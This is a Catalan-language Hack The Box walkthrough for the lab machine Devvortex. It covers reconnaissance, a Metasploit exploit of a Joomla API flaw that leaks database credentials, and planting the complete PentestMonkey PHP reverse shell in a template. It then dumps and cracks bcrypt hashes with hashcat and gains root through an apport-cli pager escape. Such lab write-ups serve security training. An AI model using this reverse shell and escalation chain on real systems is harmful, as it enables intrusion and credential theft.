Anirem directe al reconeixement actiu, fent un nmap directament i saltant-nos el reconeixement passiu:
```
┌──(polkali㉿polkali)-[~]
└─$ nmap 10.10.11.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-03 17:26 CEST
Nmap scan report for 10.10.11.242
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds`
```

Trobem dos ports oberts, accés a una web i a la que tinguem unes credencials ens podrem connectar per SSH.

Abans de anar al port 80 per el navegador, farem un wget i un whatweb per veure que hi ha. Ho fem directe a la IP ja que encara no tenim el domini, i així potser el podem treure:
```
┌──(polkali㉿polkali)-[~]
└─$ whatweb http://10.10.11.242
http://10.10.11.242 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu
Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], RedirectLocation[http://devvortex.htb/], Title[302
Found], nginx[1.18.0]
http://devvortex.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb],
HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1],
Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]`
```

Efectivament veiem com ens redirigeix al domini http://devvortex.htb/ .
Ara farem un wget + IP:

```
┌──(polkali㉿polkali)-[~]
└─$ wget http://10.10.11.242
--2024-04-03 17:30:38-- http://10.10.11.242/
Connecting to 10.10.11.242:80... connected.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: http://devvortex.htb/ [following]
--2024-04-03 17:30:38-- http://devvortex.htb/
Resolving devvortex.htb (devvortex.htb)... 10.10.11.242
Reusing existing connection to 10.10.11.242:80.
HTTP request sent, awaiting response... 200 OK
Length: 18048 (18K) [text/html]
Saving to: ‘index.html’
index.html 100%[======================================>] 17.62K --.-
KB/s in 0.03s
2024-04-03 17:30:38 (552 KB/s) - ‘index.html’ saved [18048/18048]`
```

I obtenim un resultat molt similar, veiem el mateix 302 que teniem amb el whatweb i a Location veiem a on ens ha redirigit.

Ara afegirem aquest domini al fitxer /etc/hosts ja que cap DNS ens redirigeix a aquest domini perquè el domini no està comprat.

Ara podem fer el whatweb amb el domini:

```
┌──(polkali㉿polkali)-[~]
└─$ whatweb http://devvortex.htb
http://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb],
HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1],
Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]`
```

Un cop accedim amb l’explorador web al domini veiem el següent:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/2dbfc617-8c38-4283-b120-bbefaacfc8fd)

Ara mirarem el codi font (Cntrl+U) per veure si podem veure amb què o com està fet per si trobéssim un fet amb Wordpress o alguna cosa per l’estil, abaix de tot de la pàgina web segurament també ho veuríem si fos el cas.

Hi ha uns formularis amb inputs d’entrada, provem injecció SQL però sense bons resultats. Per tant anirem a mirar de trobar com s’entra a l’administració d’aquesta web. 

Hem de mirar de trobar si hi ha un URL d’accés a aquest lloc.

Per tant provarem de fer un gobuster, com que ens interessa buscar subdominis (no directoris) posem vhost primer:

```
┌──(polkali㉿polkali)-[/usr/share/wordlists/dirbuster]
└─$ gobuster vhost --append-domain -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u
http://devvortex.htb
Sembla que ha trobat un entorn de desenvolupament:
Found: dev.devvortex.htb Status: 200 [Size: 23221]
Ara l’afegirem al fitxer /etc/hosts i provarem d’accedir-hi:

127.0.0.1 localhost
127.0.1.1 polkali
10.10.11.242 devvortex.htb dev.devvortex.htb`
```


Comprovem que funciona:

```
┌──(polkali㉿polkali)-[/usr/share/wordlists/dirbuster]
└─$ ping dev.devvortex.htb
PING devvortex.htb (10.10.11.242) 56(84) bytes of data.
64 bytes from devvortex.htb (10.10.11.242): icmp_seq=1 ttl=63 time=31.3 ms`
```

I ara ja hi podem accedir amb l’explorador web:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/2cb41f3a-dff5-442f-bff4-0c086727ab05)


Tota la web canvia veiem, segurament serà la que voldran tenir ara.

Ara podriem anar al http://dev.devvortex.htb/robots.txt per veure si veiem els fitxers que no volen que s’indexin:

```
User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/`
```


I ens ha tocat el premi, ara podríem haver passat el gobuster a dir (per cercar directoris i no subdominis) però amb això ja hem trobat el que necessitarem segurament.

Ara anirem a administrator que sembla prometedor, i acabem de descobrir que al darrere hi ha el software Joomla:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/d580b8f0-2d27-44bd-83d7-3e0b8409ad9f)


Ara provarem el codi font (Ctrl + U) però tampoc hi veiem res.

Ara farem un joomscan ja que el software trobat és Joomla, primer haurem d’instal·lar el programa:

```
┌──(polkali㉿polkali)-[/usr/share/wordlists/dirbuster]
└─$ joomscan -h
Command 'joomscan' not found, but can be installed with:
sudo apt install joomscan
Do you want to install it? (N/y)y
sudo apt install joomscan`
```

Mirem com s’ha d’utilitzar però sembla que amb -u en farem prou:

```
Help :
Usage: joomscan [options]
--url | -u <URL> | The Joomla URL/domain to scan.`
```

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/f6baed9d-ebee-45ee-9398-6f7570235792)


Veiem que no té cap WAF per exemple, però el que ens interessa sobretot és la versió que té:

```
[+] Detecting Joomla Version
[++] Joomla 4.2.6`
```

Ara buscarem si té algun CVE o algun exploit, per tant mirarem si amb el metasploit ho trobem i tenim premi:

```
msf6 > search joomla 4.2
Matching Modules
================
 # Name Disclosure Date Rank Check Description
 - ---- --------------- ---- ----- -----------
 0 auxiliary/scanner/http/joomla_api_improper_access_checks 2023-02-01 normal Yes
Joomla API Improper Access Checks
Interact with a module by name or index. For example info 0, use 0 or use
auxiliary/scanner/http/joomla_api_improper_access_checks
msf6 >`
```

Ara el configurem i l’executem:

```
msf6 auxiliary(scanner/http/joomla_api_improper_access_checks) > set RHOSTS
dev.devvortex.htb
RHOSTS => dev.devvortex.htb
msf6 auxiliary(scanner/http/joomla_api_improper_access_checks) > run

[+] Users JSON saved to
/home/polkali/.msf4/loot/20240403181548_default_10.10.11.242_joomla.users_078359.bin
[+] Joomla Users
============
 ID Super User Name Username Email Send Email Register Date Last Visit
Date Group Names
 -- ---------- ---- -------- ----- ---------- ------------- --------------- -----------
 649 * lewis lewis lewis@devvortex.htb 1 2023-09-25 16:44:24 2024-04-03
15:03:39 Super Users
 650 logan paul logan logan@devvortex.htb 0 2023-09-26 19:15:42
Registered
[+] Config JSON saved to
/home/polkali/.msf4/loot/20240403181548_default_10.10.11.242_joomla.config_234417.bin
[+] Joomla Config
=============
 Setting Value
 ------- -----
 db encryption 0
 db host localhost
 db name joomla
 db password P4ntherg0t1n5r3c0n##
 db prefix sd4fg_
 db user lewis
 dbtype mysqli
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/joomla_api_improper_access_checks) >`
```

I tenim les dades de la BD, la passwd, etc. A més tenim l’usuari lewis que és Superusuari i podríem provar si funciona:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/4ae51077-4258-4435-8b73-f3c6c09d59f2)


I funciona i estem a dins de Joomla amb un usuari administrador, tot per tenir un software desactualitzat:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/b4ced7b2-73de-4779-afea-d75b9cd0c1cb)


Ara aquí dins, veiem que ens salta un missatge que ens diu que té una versió de PHP obsoleta, es podria investigar per aquí.

Ara hem de buscar alguna pàgina PHP on puguem injectar codi per obrir-nos una shell. 
Anirem a buscar el sistema de templates:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/0d38f17b-e9c1-4f1f-8f18-c6e9aeb6de3f)


Anem a veure els fitxers del template:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/89f3403a-7c9e-488b-8e09-68359720a153)


I els podem editar, per tant hem de buscar un reverse shell amb PHP, també en podem pujar o editar un:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/dfcf9a2b-eb35-4caa-a84c-7cbff831bb33)

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/137bf4f8-7b62-4538-ac1a-b7bcf847079e)


Provarem aquesta comanda per fer la reverse shell trobada a aquesta url:

https://www.revshells.com/ i és la reverse shell que es diu ‘PHP PentestMonkey’

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped
to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/phpreverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
 $pid = pcntl_fork();

 if ($pid == -1) {
 printit("ERROR: Can't fork");
 exit(1);
 }

 if ($pid) {
 exit(0); // Parent exits
 }
 if (posix_setsid() == -1) {
 printit("Error: Can't setsid()");
 exit(1);
 }
 $daemon = 1;
} else {
 printit("WARNING: Failed to daemonise. This is quite common and not
fatal.");
}
chdir("/");
umask(0);
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
 printit("$errstr ($errno)");
 exit(1);
}
$descriptorspec = array(
 0 => array("pipe", "r"), // stdin is a pipe that the child will read from
 1 => array("pipe", "w"), // stdout is a pipe that the child will write to
 2 => array("pipe", "w") // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
 printit("ERROR: Can't spawn shell");
 exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
 if (feof($sock)) {
 printit("ERROR: Shell connection terminated");
 break;
 }
 if (feof($pipes[1])) {
 printit("ERROR: Shell process terminated");
 break;
 }
 $read_a = array($sock, $pipes[1], $pipes[2]);
 $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 if (in_array($sock, $read_a)) {
 if ($debug) printit("SOCK READ");
 $input = fread($sock, $chunk_size);
 if ($debug) printit("SOCK: $input");
 fwrite($pipes[0], $input);
 }
 if (in_array($pipes[1], $read_a)) {
 if ($debug) printit("STDOUT READ");
 $input = fread($pipes[1], $chunk_size);
 if ($debug) printit("STDOUT: $input");
 fwrite($sock, $input);
 }
 if (in_array($pipes[2], $read_a)) {
 if ($debug) printit("STDERR READ");
 $input = fread($pipes[2], $chunk_size);
 if ($debug) printit("STDERR: $input");
 fwrite($sock, $input);
 }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
 if (!$daemon) {
 print "$string\n";
 }
}
?>`
```

Hem hagut de modificar el port nostre i posar la IP nostre també.

Ara guardem el fitxer, posem la Kali a escoltar al port i entrarem després a la url. Ara un cop hem desat:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/e8f4679f-434e-459f-80d5-701d02c3ab94)



Anem a escoltar amb la Kali:

```
┌──(polkali㉿polkali)-[~]
└─$ nc -nvlp 4444`
```

I haurem d’executar aquesta URL: Editing file
"http://dev.devvortex.htb/administrator/templates/atum/patataPol.php" in template "atum".

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/ce60303d-d39d-4fc4-82f7-34463dd97082)


Ara amb whoami o id veiem ja que som l’usuari www-data:

```
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$`
```

Ara sanejem la consola:

```
$ script /dev/null -c /bin/bash
Script started, file is /dev/null
www-data@devvortex:/$ ^Z
zsh: suspended nc -nvlp 4444`
```

```
┌──(polkali㉿polkali)-[~]
└─$ stty raw -echo; fg
[3] continued nc -nvlp 4444
 export TERM=xterm
www-data@devvortex:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:/$`
```


Les comandes en ordre han estat les següents:

```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
export TERM=xterm`
```

I ara accedirem a la BD mysql:

```
`www-data@devvortex:/$ mysql -u lewis -p
Enter password:
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 142
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)
Copyright (c) 2000, 2023, Oracle and/or its affiliates.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql>
````

Ara mirarem les BD que hi ha i seleccionarem la joomla:

```
`mysql> show databases;
+--------------------+
| Database |
+--------------------+
| information_schema |
| joomla |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
mysql> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
mysql>
Ara mirem les taules i en veiem una que es diu users, és la que seleccionarem:
mysql> select * from sd4fg_users
 -> ;
+-----+------------+----------+---------------------+--------------------------------------------------------------
+-------+-----------+---------------------+---------------------+------------
+----------------------------------------------------------------------------------------------------------------------
-----------------------------------+---------------+------------+--------+------+--------------+--------------+
| id | name | username | email | password | block |
sendEmail | registerDate | lastvisitDate | activation | params
| lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------
+-------+-----------+---------------------+---------------------+------------
+----------------------------------------------------------------------------------------------------------------------
-----------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis | lewis | lewis@devvortex.htb |
$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u | 0 | 1 |
2023-09-25 16:44:24 | 2024-04-03 16:52:12 | 0 |
| NULL | 0 | | | 0 | |
| 650 | logan paul | logan | logan@devvortex.htb |
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 | 0 | 0 |
2023-09-26 19:15:42 | NULL | |
{"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","
a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL | 0 | | |
0 | |
+-----+------------+----------+---------------------+--------------------------------------------------------------
+-------+-----------+---------------------+---------------------+------------
+----------------------------------------------------------------------------------------------------------------------
-----------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
mysql>`
```

Veiem que hi ha les contrasenyes guardades en hashes per els usuaris logan i lewis i ara els mirarem de crackejar:

```
mysql> select username, password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password |
+----------+--------------------------------------------------------------+
| lewis | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
mysql>`
```


Ara primer haurem de mirar el tipus de hash que són:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/f117dcfa-22ca-48c3-80e0-a61a4b54903e)


I veiem que és un bcrypt. Ara amb hashcat mirarem si podem crackejar els hash, però primer guardem els hashs a un fitxer:

```
┌──(polkali㉿polkali)-[~]
└─$ cat hashos.txt
$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`
```

I ara podem llençar la comanda de hashcat:

```
┌──(polkali㉿polkali)-[~]
└─$ hashcat -a 0 -m 3200 -O hashos.txt /usr/share/wordlists/rockyou.txt
````

I trobem un dels dos hash (el d’en logan)amb el rockyou:

```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>`
```

Com veiem la contrasenya d’en logan és tequieromucho. Ara per tant ens connectarem per ssh directament amb les credencials d’en logan:

```
┌──(polkali㉿polkali)-[/usr/share/wordlists/dirbuster]
└─$ ssh logan@10.10.11.242
````

I ara accedim com a logan:

```
logan@devvortex:~$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)
logan@devvortex:~$ whoami
logan`
```

I agafem la flag de l’user:

```
logan@devvortex:~$ ls
user.txt
logan@devvortex:~$ cat user.txt
5e26faef8cb226d18bf03fe39d12ec47
logan@devvortex:~$`
```

Ara fem la comanda sudo -l per veure a on té permisos d’execució en logan, i veiem que té permisos aquí:

```
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User logan may run the following commands on devvortex:
 (ALL : ALL) /usr/bin/apport-cli`
```

Per tant busquem per internet el binari apport-cli què fa. A la primera entrada de totes però ja trobem un CVE:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/47e332ae-afe7-4d17-be62-d6f66d794a0e)



L’apport-cli és un petit programa que fa un report quan hi ha un crash.

Per saber la versió de l’apport-cli fem la comanda següent:

```
logan@devvortex:~$ apport-cli --version
2.20.11`
```

Com veiem a la primera entrada ens funcionarà aquest CVE: diego-tella/CVE-2023-1326-PoC: A proof of concept for CVE-2023–1326 in apport-cli 2.26.0 (github.com)
Veiem que aquesta vulnerabilitat és una escalada de privilegis (justament el que busquem) i només funciona si ets sudoer (el nostre cas).

Posem la comanda de l’enllaç que hem trobat del CVE al github:

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/d774118f-1283-485e-b9d3-09eb9044bcf4)


Però no ens va:

```
logan@devvortex:~$ sudo /usr/bin/apport-cli -c /var/crash/some_crash_file.crash
*** Error: Invalid problem report
No such file or directory
Press any key to continue...
logan@devvortex:~$`
```

Ara hem de fer el següent:

```
logan@devvortex:~$ sudo /usr/bin/apport-cli --file-bug
*** What kind of problem do you want to report?`
```

Un cop executem la comanda de dalt, posem opcions (jo he clicat 1 i després 2) i quan arribem aquí hem de clicar v:

```
`automatically opened web browser.
What would you like to do? Your options are:
 S: Send report (1.4 KB)
 V: View report
 K: Keep report file for sending later or copying to somewhere else
 I: Cancel and ignore future crashes of this program version
 C: Cancel
Please choose (S/V/K/I/C):`
```

I ens ensenya el report:

```
`== CasperMD5CheckResult =================================
skip
== Date =================================
Wed Apr 3 17:42:52 2024
== DistroRelease =================================
Ubuntu 20.04
== Package =================================
xorg (not installed)
== ProblemType =================================
Bug
== ProcCpuinfoMinimal =================================
processor : 1
vendor_id : AuthenticAMD
cpu family : 23
model : 49
model name : AMD EPYC 7302P 16-Core Processor
stepping : 0
cpu MHz : 2994.375
cache size : 512 KB
physic`
```

I ara aquí per ser root hem de posar !/bin/bash/:

```
== ProblemType =================================
Bug
== ProcCpuinfoMinimal =================================
processor : 1
vendor_id : AuthenticAMD
cpu family : 23
model : 49
model name : AMD EPYC 7302P 16-Core Processor
stepping : 0
cpu MHz : 2994.375
cache size : 512 KB
physical id : 2
siblings : 1
!/bin/bash`
```

I ja som root:

```
What would you like to do? Your options are:
 S: Send report (1.4 KB)
 V: View report
 K: Keep report file for sending later or copying to somewhere else
 I: Cancel and ignore future crashes of this program version
 C: Cancel
Please choose (S/V/K/I/C): v
root@devvortex:/home/logan# whoami
root
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)
root@devvortex:/home/logan#`
```

I ara ja podem buscar i obtenir la flag de root:

```
root@devvortex:/home/logan# cd /root
root@devvortex:~# ls
root.txt
root@devvortex:~# cat root.txt
b7deb1bbdf0400b72aae04f81ca6a681
root@devvortex:~#
````

I ja haurem acabat la màquina.

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/4dc0d1d4-86df-4757-b725-d10e52517f51)

